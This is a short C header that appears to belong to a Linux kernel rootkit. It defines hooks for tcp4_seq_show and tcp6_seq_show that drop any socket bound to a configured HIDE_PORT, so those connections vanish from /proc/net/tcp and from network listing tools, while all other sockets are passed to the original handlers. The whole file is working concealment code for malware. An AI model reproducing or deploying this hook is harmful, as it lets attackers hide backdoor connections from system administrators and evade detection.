#ifndef TCPX_SEQ_SHOW_H
#define TCPX_SEQ_SHOW_H
#include "../config.h"

// tcp4_seq_show: https://github.com/torvalds/linux/blob/e48e99b6edf41c69c5528aa7ffb2daf3c59ee105/net/ipv4/tcp_ipv4.c#L2990
// sock->sk_num: https://github.com/torvalds/linux/blob/master/include/net/sock.h#L361

static asmlinkage int(*original_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int tcp4_seq_show_hook(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == HIDE_PORT) {
        return 0;
    }

    return original_tcp4_seq_show(seq, v);
}

static asmlinkage int(*original_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int tcp6_seq_show_hook(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == HIDE_PORT) {
        return 0;
    }

    return original_tcp6_seq_show(seq, v);
}

#endif // !TCPX_SEQ_SHOW_H